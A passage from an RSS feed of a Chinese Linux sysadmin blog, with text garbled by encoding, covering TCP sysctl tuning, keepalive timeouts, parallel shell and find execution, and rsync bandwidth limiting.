&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_max_tw_buckets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1800000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# TIME_WAIT socket policy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Note: if both enabled then disable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# net.ipv4.tcp_timestamps for servers &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# behind NAT to prevent dropped incoming connections&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.ipv4.tcp_tw_recycle = 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_tw_reuse&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Enable TCP MTU probing (in case of Jumbo Frames enabled)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.ipv4.tcp_mtu_probing = 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Speedup retrans (Google recommended)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_slow_start_after_idle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_early_retrans&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Conntrack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 288bytes x 131072 = 37748736 (~38MB) max memory usage&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.netfilter.nf_conntrack_max = 131072&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.netfilter.nf_conntrack_tcp_loose = 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#TCPçš„ç›´æ¥æ‹¥å¡é€šå‘Š(tcp_ecn)å…³æ‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_ecn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è·¯ç”±ç¼“å­˜åˆ·æ–°é¢‘ç‡ï¼Œå½“ä¸€ä¸ªè·¯ç”±å¤±è´¥åå¤šé•¿æ—¶é—´è·³åˆ°å¦ä¸€ä¸ªè·¯ç”±ï¼Œé»˜è®¤æ˜¯300ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.route.gc_timeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è®¾å®šç³»ç»Ÿä¸­æœ€å¤šå…è®¸åœ¨å¤šå°‘TCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œæ²¡æœ‰ä¸ç”¨æˆ·æ–‡ä»¶å¥æŸ„å…³è”çš„TCP å¥—æ¥å­—å°†ç«‹å³è¢«å¤ä½&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#é˜²ç®€å•Dos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_max_orphans&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;655360&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# NOTE: Enable this if machine support it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -- 10gbe tuning from Intel ixgb driver README -- #&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# turn off selective ACK and timestamps&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.ipv4.tcp_sack = 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#net.ipv4.tcp_timestamps = 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;** æ³¨æ„ï¼Œnet.ipv4.tcp_tw_recycle ä¸è¦æ‰“å¼€ï¼Œåœ¨ NAT ç¯å¢ƒä¸­ä¼šå‡ºé”™ï¼Œè€Œä¸”åœ¨ K8S ä¸­ä¹Ÿä¼šå›  NAT å¯¼è‡´ pod å‡ºé”™ï¼Œåˆ‡è®°ï¼ï¼ï¼**&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxå†…æ ¸TCPè¿æ¥Keep-Alive timeoutçš„é…ç½®</title>
      <link>https://rendoumi.com/posts/20211102-tcp_keealive/</link>
      <pubDate>Tue, 02 Nov 2021 09:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211102-tcp_keealive/</guid>
      <description>&lt;h4 id=&#34;custom-configuration-of-tcp-socket-keep-alive-timeouts&#34;&gt;Custom Configuration of TCP Socket Keep-Alive Timeouts&lt;/h4&gt;
&lt;p&gt;è¿™æ˜¯ä¸ªå¤è€çš„è¯é¢˜ï¼Œæˆ‘ä»¬åœ¨æœºå™¨çš„ä¼˜åŒ–ä¸­ï¼Œéœ€è¦è®¾ç½® TCP Socket çš„ Timeout å‚æ•°&lt;/p&gt;
&lt;p&gt;ç”¨æ¥åŠ å¿« TCP å…³é—­æ— ç”¨é—²ç½®è¿æ¥çš„æ—¶é—´&lt;/p&gt;
&lt;p&gt;Linux å†…æ ¸ä¸­æœ‰ä¸‰ä¸ªç¼ºçœå‚æ•°:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tcp_keepalive_time
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;ç¼ºçœæ˜¯ 7200 ç§’&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tcp_keepalive_probes
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;ç¼ºçœæ˜¯ 9&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tcp_keepalive_intvl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;ç¼ºçœæ˜¯ 75 ç§’&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ª TCP socket è¿æ¥ï¼Œå¼€å§‹è·ŸæœåŠ¡å™¨é€šè®¯&lt;/p&gt;
&lt;p&gt;äºŒã€å¦‚æœè¿™æ¡ socket è¿æ¥ç©ºé—²æ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“ï¼Œé™é»˜äº† &lt;code&gt;tcp_keepalive_time&lt;/code&gt; ç§’åï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘é€ä¸€ä¸ªç©ºçš„ &lt;code&gt;ACK&lt;/code&gt; åŒ…åˆ°æœåŠ¡å™¨&lt;/p&gt;
&lt;p&gt;ä¸‰ã€é‚£ä¹ˆï¼Œæ ¹æ®æœåŠ¡å™¨æ˜¯å¦å›åº”äº†ä¸€ä¸ªç›¸åº”çš„ ACK åŒ…æ¥åˆ¤æ–­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ACK    
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;æœªå›åº”
&lt;ol&gt;
&lt;li&gt;ç­‰å¾… &lt;code&gt;tcp_keepalive_intvl&lt;/code&gt; ç§’ï¼Œç„¶åå†å‘ä¸€ä¸ª &lt;code&gt;ACK&lt;/code&gt; åŒ…&lt;/li&gt;
&lt;li&gt;é‡å¤ä»¥ä¸Šç­‰å¾…å¹¶å‘é€ ACK åŒ…çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ¬¡æ•°ç­‰äº &lt;code&gt;tcp_keepalive_probes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å¦‚æœç¬¬2æ­¥åšå®Œè¿˜æ”¶ä¸åˆ°ä»»ä½•å›åº”ï¼Œå‘é€ä¸€ä¸ª &lt;code&gt;RST&lt;/code&gt; åŒ…å¹¶å…³é—­è¿æ¥&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å›åº”äº†&lt;/strong&gt;: å›åˆ°ä¸Šè¿°ç¬¬äºŒæ­¥&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£ä¹ˆç¼ºçœæƒ…å†µä¸‹ï¼Œ7200+75Ã—9ï¼Œä¸€ä¸ªæ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“çš„ socket æ‰ä¼šè¢«å…³é—­ï¼Œå¤§æ¦‚æ˜¯2å°æ—¶11åˆ†é’Ÿã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>shellä»¥åŠfindçš„å¤šçº¿ç¨‹æ‰§è¡Œ</title>
      <link>https://rendoumi.com/posts/20211029-bash_multithread/</link>
      <pubDate>Fri, 29 Oct 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211029-bash_multithread/</guid>
      <description>&lt;p&gt;è¿™å±äºShellçš„é«˜çº§æŠ€å·§äº†ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨ bash ä¸­å¹¶å‘ wget rsync æ–‡ä»¶ï¼Œä¸‹é¢å°±è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä»ç®€å•çš„å•çº¿ç¨‹å¼€å§‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;seq &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 2&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œä¸‹é¢å˜å¤šçº¿ç¨‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;seq &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 2&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;245505&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;245506&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   Done                    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   Done                    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªæŠŠ ; å·æ”¹æˆäº† &amp;amp; å·ï¼Œç¨‹åºå°±å˜æˆäº†å¤šçº¿ç¨‹æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åŒºåˆ«åœ¨äº ; å·ä¼šç­‰å¾…ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•å†æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œè€Œ &amp;amp; ä¸ç­‰å¾…ï¼Œç›´æ¥ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ï¼›ç›¸å½“äºåå°è¿è¡Œäº†å‰ä¸€æ¡å‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¯´è¯´ find çš„å•çº¿ç¨‹å’Œå¤šçº¿ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;find çš„ exec ç”¨æ³•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ find /path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;args&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -exec &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;cmd&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;{} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½•&lt;/li&gt;
&lt;li&gt;; å¯¹äºæ¯ä¸€æ¡æ‰¾åˆ°çš„å•ç‹¬è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯ä¸€æ¡ä¸€æ¡å•ç‹¬æ‰§è¡Œçš„&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: cmd result1; cmd result2; &amp;hellip;; cmd result N&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ find /path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;args&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -exec &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;cmd&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;{} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½•&lt;/li&gt;
&lt;li&gt;+  å¯¹äºæ‰¾åˆ°çš„æ‰€æœ‰è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯åˆå¹¶äº†æ‰€æœ‰è®°å½•é›†æ‰§è¡Œçš„&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œé¡ºåºå¦‚ä¸‹: cmd result1 result2 &amp;hellip; result N&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¤šä¸ªexecå¯ä»¥ä¸²èµ·æ¥ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹çš„ç¨‹åºé™é€Ÿè½¯ä»¶Trickle</title>
      <link>https://rendoumi.com/posts/20211028-trickle/</link>
      <pubDate>Thu, 28 Oct 2021 11:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211028-trickle/</guid>
      <description>&lt;p&gt;ä¹‹å‰è®²è¿‡å¦‚ä½•å¯¹ opnvpn æ€»ä½“é™é€Ÿï¼Œè¿™æ¬¡æ¥äº†ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ç¨‹åºé™é€Ÿéœ€æ±‚ï¼š&lt;/p&gt;
&lt;p&gt;åœºæ™¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ä¸¤ä¸ªæœºæˆ¿é—´æœ‰ä¸€æ¡ä¸“çº¿ 100M&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸¤ä¸ªæœºæˆ¿é—´éœ€è¦åŒæ­¥æ•°æ®ï¼ŒåŒæ­¥éœ€è¦é™åˆ¶åˆ°60Mï¼Œç»™åˆ«çš„ç¨‹åºç•™å‡ºå¸¦å®½ç©ºé—´&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¼ è¾“æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œç”¨ rsync å¹¶å‘ä¼ é€&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åˆ†æäº†ä¸€ä¸‹è„šæœ¬çš„æ ¸å¿ƒéƒ¨åˆ†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find . -type f  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date -d&lt;span class=&#34;s2&#34;&gt;&amp;#34;-1 day&amp;#34;&lt;/span&gt; +&lt;span class=&#34;s1&#34;&gt;&amp;#39;%Y%m%d&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;xargs -I % -P &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; rsync -auvPR % 192.168.9.17::mysql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘ç°æ˜¯åˆ©ç”¨ xargs çš„å¹¶å‘ï¼Œ-P 30 æœ€å¤§å¹¶å‘30ä¸ªï¼Œå¯åŠ¨äº† rsync åŒæ­¥&lt;/p&gt;
&lt;p&gt;rsync æ²¡æœ‰é™é€Ÿï¼Œè¿™å°±éº»çƒ¦äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ&#34;&gt;ä¸€ã€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆæ˜¯ä½¿ç”¨ rsync çš„ &amp;ndash;bwlimit=600 å‚æ•°ï¼ŒæŠŠé€Ÿåº¦é™åˆ¶ä¸º 600KB/s ï¼Œ600Ã—8=4800ï¼Œå•è¿›ç¨‹åŸºæœ¬æ˜¯5Mçš„é€Ÿåº¦ï¼Œæœ€å¤šåªèƒ½è·‘12ä¸ªäº†ï¼Œå°±ä¼šè·‘åˆ°60Mã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·ä¹Ÿä¸å¤ªå¯¹ï¼Œå°¤å…¶æ˜¯ rsync å¹¶å‘è¿›ç¨‹é€æ¸å‡å°‘ï¼Œå°‘äº12ä¸ªçš„æ—¶å€™ï¼Œè¿™æ ·å°±å‡ºç°è·‘ä¸æ»¡60Mçš„ç°è±¡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒå¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ&#34;&gt;äºŒã€å¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ&lt;/h2&gt;
&lt;p&gt;é‚£ä¹ˆ rsync æ”¯æŒå¤šæ–‡ä»¶ä¼ è¾“ ï¼Œä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ•´ä½“é™é€Ÿ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rsync --bwlimit&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7200&lt;/span&gt; -auvPR æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 192.168.9.17::mysql 
